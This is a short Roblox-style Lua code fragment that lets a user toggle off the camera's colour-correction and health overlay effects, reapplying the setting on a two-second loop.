-- ============================================================
local function applyCamFX()
    local cam = workspace:FindFirstChild("Camera")
    if not cam then return end
    local enabled = not (Toggles.DisableCamEffects and Toggles.DisableCamEffects.Value)
    for _, name in ipairs({"healtheffect1","ColourCorrection"}) do
        local fx = cam:FindFirstChild(name)
        if fx and fx:IsA("ColorCorrectionEffect") then fx.Enabled=enabled end
    end
end
Toggles.DisableCamEffects:OnChanged(applyCamFX)
task.spawn(function()
    while true do
        task.wait(2)
        if Toggles.DisableCamEffects and Toggles.DisableCamEffects.Value then applyCamFX() end
    end
end)

